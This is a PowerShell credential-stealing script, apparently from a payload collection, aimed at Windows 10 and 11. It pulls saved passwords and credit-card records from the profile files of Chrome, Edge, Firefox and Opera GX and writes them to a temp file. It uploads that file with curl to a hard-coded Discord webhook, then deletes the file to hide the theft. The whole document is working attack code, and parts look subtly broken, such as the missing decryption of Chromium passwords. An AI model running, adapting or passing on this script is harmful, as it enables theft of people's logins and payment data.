# Title: Browser Data Exfiltration with Remote Script Execution
# Author: Jakoby
# Description: This script extracts saved usernames/passwords and credit card information from Chrome, Firefox, and Opera GX on Windows 10/11 targets.

# Target OS: Windows 10, 11

function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Position = 1, Mandatory = $True)]
        [string]$Browser,
        [Parameter(Position = 2, Mandatory = $True)]
        [string]$DataType
    )

    $Path = switch ($Browser) {
        'chrome'  { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data" } }
        'edge'    { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data" } }
        'firefox' { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" } }
        'opera'   { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" } }
        default { Write-Host 'Unsupported browser or data type specified'; return }
    }

    if (-not (Test-Path $Path)) {
        Write-Host "The path for $Browser $DataType could not be found."
        return
    }

    try {
        if ($DataType -eq 'passwords' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
            $sqliteCommand = "sqlite3.exe"
            $query = "SELECT origin_url, username_value, password_value FROM logins"
            if (Test-Path $sqliteCommand) {
                $passwordData = & $sqliteCommand $Path $query
                Write-Output "[$Browser Passwords]: $passwordData"
            } else {
                Write-Host 'sqlite3.exe not found. Unable to extract passwords.'
            }
        } elseif ($DataType -eq 'passwords' -and $Browser -eq 'firefox') {
            $firefoxData = Get-Content -Path $Path | ConvertFrom-Json
            Write-Output "[Firefox Passwords]: $($firefoxData.logins)"
        } elseif ($DataType -eq 'creditcards' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
            $sqliteCommand = "sqlite3.exe"
            $query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
            if (Test-Path $sqliteCommand) {
                $creditCardData = & $sqliteCommand $Path $query
                Write-Output "[$Browser Credit Cards]: $creditCardData"
            } else {
                Write-Host 'sqlite3.exe not found. Unable to extract credit card information.'
            }
        } else {
            Write-Host "Unsupported data type for $Browser"
        }
    } catch {
        Write-Host "Failed to extract $DataType from $Browser"
    }
}

# Define exfiltration method (Discord webhook)
$dc = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo'

# Check if Discord webhook is set
if ([string]::IsNullOrEmpty($dc)) {
    Write-Host 'No exfiltration method set. Exiting.'
    exit
}

# Collect browser data
$outputFile = "$env:TMP\--BrowserData.txt"
Get-BrowserData -Browser "edge" -DataType "passwords" >> $outputFile
Get-BrowserData -Browser "edge" -DataType "creditcards" >> $outputFile
Get-BrowserData -Browser "chrome" -DataType "passwords" >> $outputFile
Get-BrowserData -Browser "chrome" -DataType "creditcards" >> $outputFile
Get-BrowserData -Browser "firefox" -DataType "passwords" >> $outputFile
Get-BrowserData -Browser "opera" -DataType "passwords" >> $outputFile
Get-BrowserData -Browser "opera" -DataType "creditcards" >> $outputFile

# Send completion notification to Discord
try {
    $body = @{ "content" = 'Browser data exfiltration script executed successfully, including browser data.' } | ConvertTo-Json
    Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
    curl.exe -F "file1=@$outputFile" $dc
} catch {
    Write-Host 'Failed to send notification to Discord webhook.'
}

# Clean up
Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
